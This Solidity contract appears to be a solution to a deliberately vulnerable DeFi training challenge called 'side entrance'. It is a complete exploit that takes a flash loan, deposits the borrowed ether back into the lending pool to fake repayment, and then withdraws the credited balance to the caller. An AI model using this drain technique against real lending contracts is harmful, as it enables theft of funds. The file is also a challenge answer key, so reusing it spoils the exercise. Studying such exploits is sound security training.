
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../../contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    using Address for address payable; 
    address payable private pool; 
    address payable owner;
  
    constructor(address payable poolAddress) {
        pool = poolAddress;
        owner = payable(msg.sender);
    }

    function tokenMuleWithdraw() public {
        SideEntranceLenderPool(pool).withdraw();    
        payable(msg.sender).sendValue(address(this).balance);
    }

    function runFlashLoan(uint256 amount) public {
        SideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
    }
    
    receive() external payable {}
}
